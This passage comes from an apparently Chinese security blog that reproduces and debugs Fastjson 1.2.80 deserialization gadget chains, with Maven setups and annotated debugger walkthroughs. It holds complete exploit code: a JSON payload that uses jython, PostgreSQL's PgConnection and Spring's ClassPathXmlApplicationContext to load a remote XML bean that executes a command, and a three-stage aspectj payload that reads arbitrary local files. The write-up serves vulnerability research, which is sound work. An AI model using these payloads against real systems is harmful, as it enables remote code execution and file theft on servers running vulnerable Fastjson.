+<p>跟进<code>hasMoreElements()</code> -&gt; <code>next()</code> -&gt; 第二次的<code>hasMoreElements()</code> -&gt; <code>next()</code> -&gt; <code>e.hasMoreElements()</code> -&gt; <code>next()</code>；<br><img src="/./images/1663835292246.png" alt="enter description here"></p>
+<p>跟进<code>findResource()</code>，创建了与远程地址资源的 http 连接，设置请求头为<code>HEAD</code>，对远程资源进行探测；<br><img src="/./images/1663835680532.png" alt="enter description here"></p>
+<p>然后读取远程资源，使用了<code>URLStreams.openUncachedStream()</code>；<br><img src="/./images/1663835962152.png" alt="enter description here"></p>
+<p>跟进可以看到调用<code>getInputStream()</code>，向远程资源发起了 http 请求；<br><img src="/./images/1663836041057.png" alt="enter description here"></p>
+<p>命令行中可以看到两次请求的记录；<br><img src="/./images/1663836194420.png" alt="enter description here"></p>
+<p>然后也是将远程资源中的内容读到<code>transformNames</code>中，这样就获取到恶意类的名称；<br><img src="/./images/1663836266802.png" alt="enter description here"></p>
+<p>接着下面调用<code>addPhaseOperationsForGlobalTransforms()</code>；<br><img src="/./images/1663836381773.png" alt="enter description here"></p>
+<p>跟进，在该方法中依次加载并实例化了<code>transformNames</code>中的所有类；<br><img src="/./images/1663836621226.png" alt="enter description here"></p>
+<p>校验了加载的类上是否含有<code>@GroovyASTTransformation</code>注解，所以在构造恶意类时要加上注解；<br>并且得实现或继承<code>ASTTransformation</code>接口，所以恶意类要实现<code>ASTTransformation</code>，然后实例化触发命令执行。<br><img src="/./images/1663836815147.png" alt="enter description here"></p>
+<h2 id="jython-spring-context-postgresql"><a href="#jython-spring-context-postgresql" class="headerlink" title="jython+spring-context+postgresql"></a>jython+spring-context+postgresql</h2><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
+<li>Fastjson 1.2.80</li>
+<li>jython 1.1</li>
+<li>spring-context 5.0.2.RELEASE</li>
+<li>postgresql 42.3.0 (42.3.0 &lt; 版本 &lt; 42.3.2)</li>
+</ul>
+<p>在 <code>pom.xml</code>中添加如下依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.80<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		</span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.jvnet.hudson.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jython<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.postgresql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>postgresql<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>42.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>利用<code>org.springframework.context.support.ClassPathXmlApplicationContext</code>来加载远程指定的 XML 配置文件，在配置文件中定义一个 bean ，bean 中通过使用 Spring EL 表达式来调用<code>java.lang.ProcessBuilder</code>的<code>start()</code>方法来执行命令。</p>
+<p>构造 bean 文件<code>spel.xml</code>：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;calc.exe&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123; pb.start() &#125;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>起一个服务端，把 bean 文件放在根目录下；</p>
+<p>构造POC：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBCPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonStr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\&quot;@type\&quot;:\&quot;org.python.antlr.ParseException\&quot;,\&quot;type\&quot;:&#123;&#125;&#125;,&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;org.python.core.PyObject\&quot;,\&quot;@type\&quot;:\&quot;com.ziclix.python.sql.PyConnection\&quot;,&quot;</span> +</span><br><span class="line">                                    <span class="string">&quot;\&quot;connection\&quot;:&#123;&quot;</span> +</span><br><span class="line">                                                    <span class="string">&quot;\&quot;@type\&quot;:\&quot;org.postgresql.jdbc.PgConnection\&quot;,&quot;</span> +</span><br><span class="line">                                                    <span class="string">&quot;\&quot;hostSpecs\&quot;:[&#123;\&quot;host\&quot;:\&quot;127.0.0.1\&quot;,\&quot;port\&quot;:2333&#125;],&quot;</span> +</span><br><span class="line">                                                    <span class="string">&quot;\&quot;user\&quot;:\&quot;blckder02\&quot;, \&quot;database\&quot;:\&quot;test\&quot;,&quot;</span> +</span><br><span class="line">                                                    <span class="string">&quot;\&quot;info\&quot;:&#123;&quot;</span> +</span><br><span class="line">                                                            <span class="string">&quot;\&quot;socketFactory\&quot;:\&quot;org.springframework.context.support.ClassPathXmlApplicationContext\&quot;,&quot;</span> +</span><br><span class="line">                                                            <span class="string">&quot;\&quot;socketFactoryArg\&quot;:\&quot;http://127.0.0.1:8081/spel.xml\&quot;&quot;</span> +</span><br><span class="line">                                                            <span class="string">&quot;&#125;,&quot;</span> +</span><br><span class="line">                                                    <span class="string">&quot;\&quot;url\&quot;:\&quot;\&quot;&quot;</span> +</span><br><span class="line">                                                    <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">                                    <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">                             <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">obj1</span> <span class="operator">=</span> JSON.parseObject(jsonStr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>ParseException</code>继承<code>Exception</code>的子类，有一个<code>PyObject</code>类型参数<code>type</code>；<br><img src="/./images/1663917076521.png" alt="enter description here"></p>
+<p><code>PyConnection</code>继承<code>PyObject</code>，有一个<code>Connection</code>类型的参数<code>connection</code>；<br><img src="/./images/1663917159621.png" alt="enter description here"></p>
+<p><code>PgConnection</code>实现了<code>Connection</code>的子接口，构造函数中有的五个参数，连接了数据库。<br><img src="/./images/1663917470376.png" alt="enter description here"></p>
+<p><code>host</code>、<code>port</code>、<code>user</code>、<code>database</code>参数值可以随便传，不影响命令执行；<br><code>socketFactory</code>得是<code>ClassPathXmlApplicationContext</code>，<code>socketFactoryArg</code>是远程 bean 文件地址。</p>
+<h3 id="POC-调试-1"><a href="#POC-调试-1" class="headerlink" title="POC 调试"></a>POC 调试</h3><p>首先对<code>a</code>进行反序列化，原理作用和 Groovy 链一样；<br>获取到第一个<code>@type</code>的值<code>java.lang.Exception</code>，带入<code>checkAutoType()</code>；<br>从 mapping 中获取并返回 <code>clazz</code>；<br><img src="/./images/1663918654741.png" alt="enter description here"></p>
+<p><code>Exception</code>继承了<code>Throwable</code>，所以下面调用<code>ThrowableDeserializer.deserialze</code>，接着获取到第二个<code>@type</code>的值，带入<code>checkAutoType()</code>，第二个参数值不为 null；<br><img src="/./images/1663919076821.png" alt="enter description here"></p>
+<p><code>expectClassFlag</code>为 true ，加载<code>ParseException</code>类并返回；<br><img src="/./images/1663919371411.png" alt="enter description here"></p>
+<p>获取了<code>type</code>参数的类型，调用<code>cast()</code>；<br><img src="/./images/1663920067705.png" alt="enter description here"></p>
+<p>跟进到<code>castToJavaBean()</code>，把<code>PyObject</code>类型 put 进了<code>this.deserializer</code>，为后面绕过 AutoType 检测做准备；<br><img src="/./images/1663920417314.png" alt="enter description here"></p>
+<p>返回的<code>value</code>不为 null，所以下面调用<code>setValue()</code>不会报错，所以不用像 Groovy 链那样使用<code>try-catch</code>。<br><img src="/./images/1663920472022.png" alt="enter description here"></p>
+<p>然后接着反序列化<code>b</code>，获取到第一个<code>@type</code>值带入<code>checkAutoType()</code>，能直接从<code>this.deserializer</code>获取到<code>clazz</code>；<br><img src="/./images/1663920865329.png" alt="enter description here"></p>
+<p><code>PyObject</code>对应的<code>deserializer</code>类型是<code>FastjsonASMDeserializer_1_PyObject</code>，但还是调用的<code>JavaBeanDeserializer.deserialze()</code>；<br><img src="/./images/1663921502603.png" alt="enter description here"></p>
+<p>获取到第二个<code>@type</code>的值带入<code>checkAutoType()</code>，第二个参数不为 null；<br><img src="/./images/1663922193806.png" alt="enter description here"></p>
+<p>加载并返回<code>PyConnection</code>；<br><img src="/./images/1663922307136.png" alt="enter description here"></p>
+<p>跟进<code>JavaBeanDeserializer.deserialze()</code> -&gt; <code>DefaultFieldDeserializer.parseField()</code> -&gt; <code>getFieldValueDeserilizer()</code>，返回<code>JavaBeanDeserializer</code>类型；<br><img src="/./images/1663923157807.png" alt="enter description here"></p>
+<p>调用<code>deserialze()</code>，经过一堆没什么用的循环，获取了下一个<code>@type</code>的值，带入<code>checkAutoType()</code>，第二个参数不为null；<br><img src="/./images/1663923728819.png" alt="enter description here"></p>
+<p>加载并返回<code>PgConnection</code>；<br><img src="/./images/1663924735969.png" alt="enter description here"></p>
+<p>调用<code>deserialze()</code>，遍历到<code>hostSpecs</code>参数时，逐步调用到<code>getFieldValueDeserilizer()</code>，返回一个<code>ObjectArrayCode</code>类型；<br><img src="/./images/1663925015836.png" alt="enter description here"></p>
+<p>然后调用<code>ObjectArrayCode.deserialze()</code>；<br><img src="/./images/1663925180950.png" alt="enter description here"></p>
+<p>跟进<code>parserArray()</code>，调用<code>deserialze()</code>；<br><img src="/./images/1663925347263.png" alt="enter description here"></p>
+<p>获取<code>host</code>和<code>port</code>参数值，实例化了一个<code>HostSpec</code>对象并返回；<br><img src="/./images/1663925782442.png" alt="enter description here"></p>
+<p>把<code>HostSpec</code>对象转换为数组类型，赋给<code>hostSpecs</code>参数；<br><img src="/./images/1663926014902.png" alt="enter description here"></p>
+<p>接着调用<code>paseField()</code> ，跟进到 <code>MapDeserializer.deserialze()</code>，调用了<code>parseObject()</code>；<br><img src="/./images/1663926894483.png" alt="enter description here"></p>
+<p>在<code>parseObject()</code>中把<code>socketFactory</code>和<code>socketFactoryArg</code>的存入了 map 中；<br><img src="/./images/1663927254668.png" alt="enter description here"></p>
+<p>然后将<code>info</code>放入了<code>fieldValues</code>，另外几个参数赋值都差不多；<br><img src="/./images/1663927311307.png" alt="enter description here"></p>
+<p>参数全部赋值完毕后，实例化一个<code>PgConnection</code>对象；<br><img src="/./images/1663927657073.png" alt="enter description here"></p>
+<p>跟进到<code>PgConnection</code>的构造函数，调用了<code>ConnectionFactory.openConnection()</code>；<br><img src="/./images/1663927760921.png" alt="enter description here"></p>
+<p>逐步跟进到<code>getSocketFactory()</code>，调用了<code>ObjectFactory.instantiate()</code>；<br><img src="/./images/1663927927204.png" alt="enter description here"></p>
+<p>反射获取了<code>ClassPathXmlApplicationContext</code>类和构造函数，最后实例化<code>ClassPathXmlApplicationContext</code>对象；<br><img src="/./images/1663928165578.png" alt="enter description here"></p>
+<p>加载配置文件，实例化文件中的恶意对象。<br><img src="/./images/1663928442744.png" alt="enter description here"></p>
+<h2 id="aspectj-读文件"><a href="#aspectj-读文件" class="headerlink" title="aspectj 读文件"></a>aspectj 读文件</h2><h3 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
+<li>Fastjson 1.2.80</li>
+<li>aspectj 1.8.6</li>
+</ul>
+<p>在<code>pom.xml</code>中导入依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.80<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>直接来看看网上普遍使用的POC，要分三次打：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReadPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonStr1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\&quot;@type\&quot;:\&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonStr2</span> <span class="operator">=</span>  <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;\&quot;val\&quot;:&#123;&quot;</span> +</span><br><span class="line">                                    <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.String\&quot;&#123;&quot;</span> +</span><br><span class="line">                                    <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.util.Locale\&quot;,&quot;</span> +</span><br><span class="line">                                    <span class="string">&quot;\&quot;val\&quot;:&#123;&quot;</span> +</span><br><span class="line">                                                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.alibaba.fastjson.JSONObject\&quot;,&quot;</span> +</span><br><span class="line">                                                <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                                                    <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.String\&quot;&quot;</span> +</span><br><span class="line">                                                    <span class="string">&quot;\&quot;@type\&quot;:\&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\&quot;,&quot;</span> +</span><br><span class="line">                                                    <span class="string">&quot;\&quot;newAnnotationProcessorUnits\&quot;:[&#123;&#125;]&quot;</span> +</span><br><span class="line">                                                <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">                                            <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">                                       <span class="comment">// &quot;&#125;&quot; +</span></span><br><span class="line">                                    <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">							</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonStr3</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;x\&quot;:&#123;&quot;</span> +</span><br><span class="line">                                    <span class="string">&quot;\&quot;@type\&quot;:\&quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\&quot;,&quot;</span> +</span><br><span class="line">                                    <span class="string">&quot;\&quot;@type\&quot;:\&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\&quot;,&quot;</span> +</span><br><span class="line">                                    <span class="string">&quot;\&quot;fileName\&quot;:\&quot;D:/1.txt\&quot;&quot;</span> +</span><br><span class="line">                                    <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        JSON.parseObject(jsonStr1);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            JSON.parseObject(jsonStr2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj3</span> <span class="operator">=</span> JSON.parseObject(jsonStr3);</span><br><span class="line">            System.out.println(obj3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/./images/1664155793581.png" alt="enter description here"></p>
+<p>由于<code>SourceTypeCollisionException</code>的<code>newAnnotationProcessorUnits</code>参数是接口类型；<br><img src="/./images/1664178811533.png" alt="enter description here"></p>
+<p>会在<code>TypeUtils.castToJavaBean()</code>中返回一个代理对象，并不会像前两条链一样将<code>ICompilationUnit</code> put 进<code>this.deserializer</code>；<br><img src="/./images/1664179071913.png" alt="enter description here"></p>
+<p>所以 jsonStr1 中不添加<code>newAnnotationProcessorUnits</code>参数，它的作用是把<code>SourceTypeCollisionException</code>添加进<code>mapping</code>，以便后面使用。</p>
+<p><code>MiscCodec.deserialze()</code>中调用了<code>toJavaObject()</code>，可以把数组类型的参数转换成 Java 对象，然后把该参数类型 put 进<code>this.deserializer</code>；<br><code>MapDeserializer.deserialze()</code>可以把传入的各参数的值赋给对应的对象；</p>
+<p>jsonStr2 中 各类对应的<code>deserializer</code>如下：</p>
+<table>
+<thead>
+<tr>
+<th>Class</th>
+<th>deserializer</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>java.lang.Class</td>
+<td>MiscCodec</td>
+</tr>
+<tr>
+<td>java.lang.String</td>
+<td>StringCode</td>
+</tr>
+<tr>
+<td>java.util.Locale</td>
+<td>MiscCodec</td>
+</tr>
+<tr>
+<td>com.alibaba.fastjson.JSONObject</td>
+<td>MapDeserializer</td>
+</tr>
+</tbody></table>
+<p>jsonStr2 的作用就是将<code>org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit</code>类型 put 进<code>this.deserializer</code>；<br>同时构造 json 语法错误，使之抛出异常，进入下一个反序列化。</p>
+<p>jsonStr3 的作用就是利用<code>BasicCompilationUnit</code>类中的<code>getContents()</code>方法来读取文件内容；<br><code>&quot;x&quot;:&#123;&#125;</code>的作用是将<code>BasicCompilationUnit</code>对象序列化为 JSON 数据，否则输出结果如下：<br><img src="/./images/1664186469054.png" alt="enter description here"></p>
+<p>经过分析发现，其实 jsonStr2 简化为如下代码，同样可以实现读文件。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonStr2</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                                <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +</span><br><span class="line">                                <span class="string">&quot;\&quot;val\&quot;:&#123;&quot;</span> +</span><br><span class="line">                                            <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.alibaba.fastjson.JSONObject\&quot;,&quot;</span> +</span><br><span class="line">                                            <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                                                <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.String\&quot;&quot;</span> +</span><br><span class="line">                                                <span class="string">&quot;\&quot;@type\&quot;:\&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\&quot;,&quot;</span> +</span><br><span class="line">                                                <span class="string">&quot;\&quot;newAnnotationProcessorUnits\&quot;:[&#123;&#125;]&quot;</span> +</span><br><span class="line">                                            <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">                                        <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="POC-调试-2"><a href="#POC-调试-2" class="headerlink" title="POC 调试"></a>POC 调试</h3><p>获取到第一个<code>@type</code>的值，带入<code>checkAutoType()</code>，从<code>mapping</code>中获取并返回<code>Exception</code>；<br><img src="/./images/1664156066348.png" alt="enter description here"></p>
+<p>调用<code>ThrowableDeserializer.deserialze()</code>，获取到第二个<code>@type</code>的值，带入<code>checkAutoType()</code>，<code>expectClassFlag</code>为 true，加载并返回<code>SourceTypeCollisionException</code>，还把<code>SourceTypeCollisionException</code>添加进了<code>mapping</code>，这是后面绕过 AutoType 关闭限制的关键；<br><img src="/./images/1664156349017.png" alt="enter description here"></p>
+<p>然后创建并返回一个 Exception ，结束第一个反序列化。<br><img src="/./images/1664158440344.png" alt="enter description here"></p>
+<p>开始对第二个字符串进行反序列化，获取到第一个<code>@type</code>的值，带入<code>checkAutoType()</code>，从<code>this.deserializers</code>中获取并返回<code>Class</code>；<br><img src="/./images/1664158594684.png" alt="enter description here"></p>
+<p>然后调用<code>MiscCodec.deserialze()</code>；<br><img src="/./images/1664158713542.png" alt="enter description here"></p>
+<p>获取到第二个<code>@type</code>的值，带入<code>checkAutoType()</code>，从<code>mapping</code>中获取并返回<code>String</code>；<br><img src="/./images/1664158911518.png" alt="enter description here"></p>
+<p>接着调用<code>StringCode.deserialze()</code>，获取到下一个<code>@type</code>的值，带入<code>checkAutoType()</code>，从<code>mapping</code>中获取并返回<code>Locale</code>；<br><img src="/./images/1664159052585.png" alt="enter description here"></p>
+<p>调用<code>MiscCodec.deserialze()</code>，获取到下一个<code>@type</code>的值，直接在 310 行获取到<code>com.alibaba.fastjson.JSONObject</code>，不用再调用<code>checkAutoType()</code>；<br>接着往下就是调用<code>MapDeserializer.deserialze()</code>；<br><img src="/./images/1664161260032.png" alt="enter description here"></p>
+<p>获取到<code>java.lang.String</code>，然后调用<code>StringCode.deserialze()</code>，返回<code>@type</code>；<br><img src="/./images/1664163087217.png" alt="enter description here"></p>
+<p>接着分别获取后面的两个值，存入<code>map</code>；<br><img src="/./images/1664163161223.png" alt="enter description here"></p>
+<p>一直返回到<code>MiscCodec.deserialze()</code>，调用了<code>toJavaObject()</code>；<br><img src="/./images/1664163373901.png" alt="enter description here"></p>
+<p>跟进<code>toJavaObject()</code> -&gt; <code>TypeUtils.cast()</code> -&gt; <code>cast()</code> -&gt; <code>castToJavaBean()</code>，获取<code>SourceTypeCollisionException</code>带入<code>checkAutoType()</code>，从<code>mapping</code>中获取并返回 clazz；<br>然后又调用<code>castToJavaBean()</code>；<br><img src="/./images/1664164564457.png" alt="enter description here"></p>
+<p>跟进<code>createInstance()</code>，获取到<code>ICompilationUnit[]</code>类型的参数<code>newAnnotationProcessorUnits</code>，调用<code>parseField()</code> -&gt; <code>getFieldValueDeserilizer()</code> -&gt; <code>getDeserializer()</code>；<br>因为参数是数组类型，所以得到<code>ObjectArrayCode</code>类型的<code>deserializer</code>，然后把它 put 进<code>this.deserializer</code>，这里的<code>type</code>是带<code>[L...;</code>字符的；<br><img src="/./images/1664168154960.png" alt="enter description here"></p>
